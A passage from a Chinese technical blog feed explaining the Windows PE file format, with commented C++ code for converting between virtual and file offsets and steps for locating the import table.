class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FOA转VA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在文件中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">FoaToVa32</span><span class="params">(UINT foa, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//判断FOA是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (foa &lt; PeEnd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果foa位于PE文件头中，则foa==rva，直接返回foa+ImageBase即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;va:%X\n&quot;</span>, foa + nt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">        <span class="keyword">return</span> foa + nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果foa在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断foa属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (foa &gt;= sectionArr[i]-&gt;PointerToRawData &amp;&amp; foa &lt; (sectionArr[i]-&gt;PointerToRawData + sectionArr[i]-&gt;SizeOfRawData))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//找到所属的节                </span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算差值= FOA - 节.PointerToRawData </span></span><br><span class="line">            UINT offset = foa - sectionArr[i]-&gt;PointerToRawData;</span><br><span class="line">            <span class="comment">//RVA = 差值 + 节.VirtualAddress(RVA)</span></span><br><span class="line">            UINT rva = offset + sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;va:%X\n&quot;</span>, rva + nt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">            <span class="keyword">return</span> rva + nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FOA转VA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在文件中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">FoaToVa64</span><span class="params">(UINT foa, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//判断FOA是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (foa &lt; PeEnd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果foa位于PE文件头中，则foa==rva，直接返回foa+ImageBase即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;va:%X\n&quot;</span>, foa + nt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">        <span class="keyword">return</span> foa + nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果foa在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断foa属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (foa &gt;= sectionArr[i]-&gt;PointerToRawData &amp;&amp; foa &lt; (sectionArr[i]-&gt;PointerToRawData + sectionArr[i]-&gt;SizeOfRawData))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//找到所属的节                </span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算差值= FOA - 节.PointerToRawData </span></span><br><span class="line">            UINT offset = foa - sectionArr[i]-&gt;PointerToRawData;</span><br><span class="line">            <span class="comment">//RVA = 差值 + 节.VirtualAddress(RVA)</span></span><br><span class="line">            UINT rva = offset + sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;va:%X\n&quot;</span>, rva + nt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">            <span class="keyword">return</span> rva + nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建DOS对应的结构体指针</span></span><br><span class="line">    _IMAGE_DOS_HEADER* dos;</span><br><span class="line">    <span class="comment">//读取文件，返回文件句柄</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\Users\\86156\\Desktop\\N1.exe&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//根据文件句柄创建映射</span></span><br><span class="line">    HANDLE hMap = <span class="built_in">CreateFileMappingA</span>(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//映射内容</span></span><br><span class="line">    LPVOID pFile = <span class="built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//类型转换，用结构体的方式来读取</span></span><br><span class="line">    dos = (_IMAGE_DOS_HEADER*)pFile;</span><br><span class="line">    <span class="comment">//输出dos-&gt;e_magic，以十六进制输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dos-&gt;e_magic:%X\n&quot;</span>, dos-&gt;e_magic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向PE文件头标志的指针</span></span><br><span class="line">    DWORD* peId;</span><br><span class="line">    <span class="comment">//让PE文件头标志指针指向其对应的地址=DOS首地址+偏移</span></span><br><span class="line">    peId = (DWORD*)((UINT)dos + dos-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//输出PE文件头标志，其值应为4550，否则不是PE文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;peId:%X\n&quot;</span>, *peId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向可选PE头的第一个成员magic的指针</span></span><br><span class="line">    WORD* magic;</span><br><span class="line">    <span class="comment">//让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小</span></span><br><span class="line">    magic = (WORD*)((UINT)peId + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    <span class="comment">//输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic:%X\n&quot;</span>, *magic);</span><br><span class="line">    <span class="comment">//根据magic判断为32位程序还是64位程序</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (*magic)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;32位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS* nt;</span><br><span class="line">        <span class="comment">//让PE文件头指针指向其对应的地址</span></span><br><span class="line">        nt = (_IMAGE_NT_HEADERS*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">VaToFoa32</span>(<span class="number">0x4198B0</span>, dos, nt, sectionArr);</span><br><span class="line">        <span class="built_in">FoaToVa32</span>(<span class="number">0x176B0</span>, dos, nt, sectionArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;64位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS64* nt;</span><br><span class="line">        nt = (_IMAGE_NT_HEADERS64*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">VaToFoa32</span>(<span class="number">0x4198B0</span>, dos, (_IMAGE_NT_HEADERS *)nt, sectionArr);</span><br><span class="line">        <span class="built_in">FoaToVa32</span>(<span class="number">0x176B0</span>, dos, (_IMAGE_NT_HEADERS * )nt, sectionArr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据代码，我们可以.data区块的RVA值</p>
<img src="/images/PE结构-VA与FOA的转化.assets/image-20211014162356982.png" alt="image-20211014162356982" style="zoom:200%;">

<p>本文复现学习自52pojie.cn论坛的lyl610abc师傅PE文件笔记。</p>
<p>原文连接：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.52pojie.cn/thread-1412395-1-1.html</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PE结构</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构-导入表（2）</title>
    <url>/2021/10/13/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2)/</url>
    <content><![CDATA[<p>首先，PE文件中的数据被载入内存后根据不同页面属性被划分成很多区块(节)，并有区块表（节表）的数据来描述这些区块，这里我们需要注意一点：<strong>一个区块中的数据仅仅知识由于属性相同而放一起，并不一定是同一种用途的内容。例如输入表、输出表等就有可能和只读常量一起被放在同一个区块中。因为他们的属性都是可读不可写的。</strong></p>
<p>其次，由于不同用途的数据有可能被放入同一个区块中，因此仅仅依靠区块表是无法确定和定位的。因此还需要通过PE文件头中的IMAGE_OPTIONAL_READER32结构的数据目录表来指出他们的位置，我们可以由数据目录表来定位他们的位置，我们可以由数据目录表来定位的数据包括输入表、输出表、资源、重定位表和TLS等15种数据。</p>
<h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><h4 id="导入表的作用"><a href="#导入表的作用" class="headerlink" title="导入表的作用"></a>导入表的作用</h4><p>当程序运行时，需要多个PE文件共同组成</p>
<p>PE文件提供哪些功能给其他PE文件是导出表的作用</p>
<p>PE文件需要依赖的模块以及依赖模块中的哪些函数是导出表的作用</p>
<span id="more"></span>

<h4 id="什么是导出表"><a href="#什么是导出表" class="headerlink" title="什么是导出表"></a>什么是导出表</h4><p>导出表是用于记录该PE文件还需要依赖的模块以及依赖这些模块中的那些函数的一种结构</p>
<h4 id="如何定位导入表"><a href="#如何定位导入表" class="headerlink" title="如何定位导入表"></a>如何定位导入表</h4><p><strong>定位导入表的原理</strong></p>
<p>根据之前所学可知，导入、导出等表的起始位置和大小都存放在了IMAGE_OPTIONAL_HEADERS结构的DataDirectory数组当中。而导入表对应的下标为1</p>
<table>
<thead>
<tr>
<th align="left">宏定义</th>
<th align="left">值</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">IMAGE_DIRECTORY_ENTRY_IMPORT</td>
<td align="left">1</td>
<td align="left">导入表</td>
</tr>
</tbody></table>
<p>定位导入表流程</p>
<ol>
<li>找到扩展PE头IMAGE_OPTIONAL_HEADERS的最后一个成员DataDirectory[1]</li>
<li>根据DataDirectory[1].VirtualAddress 得到导入表的RVA</li>
<li>将导入表的RVA转为FOA，在文件中定位到导入表</li>
</ol>
<h3 id="根据流程定位导入表"><a href="#根据流程定位导入表" class="headerlink" title="根据流程定位导入表"></a>根据流程定位导入表</h3><h4 id="分析demo"><a href="#分析demo" class="headerlink" title="分析demo"></a>分析demo</h4><p>使用everEdit.exe</p>
<h4 id="找到DataDirectory-1"><a href="#找到DataDirectory-1" class="headerlink" title="找到DataDirectory[1]"></a>找到DataDirectory[1]</h4><p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015152622826.png" alt="image-20211015152622826"></p>
<p>根据索引，我们找到DataDirectory[1]即第二个表导出表的数据目录</p>
<table>
<thead>
<tr>
<th>iMAGE_data_directory成员</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>VirtualAddress</td>
<td>0x001CF47C</td>
<td>导出表的RVA地址</td>
</tr>
<tr>
<td>Size</td>
<td>0x00000140</td>
<td>导出表的大小</td>
</tr>
</tbody></table>
<h4 id="得到导出表的RVA"><a href="#得到导出表的RVA" class="headerlink" title="得到导出表的RVA"></a>得到导出表的RVA</h4><p>导出表的RVA即0x001CF47C</p>
<p>修改VA转FOA程序代码，求出导出表FOA</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PE.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64  0x8664</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa32</span><span class="params">(UINT va, _IMAGE_DOS_HEADER *dos,_IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew+<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);        </span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            UINT offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            UINT foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa64</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd) &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize ,(UINT)sectionArr[i]-&gt;SizeOfRawData ) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment)* nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory)) &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">				<span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase +<span class="number">0x1CF47C</span>,dos,(_IMAGE_NT_HEADERS*)nt,sectionArr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections) &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span 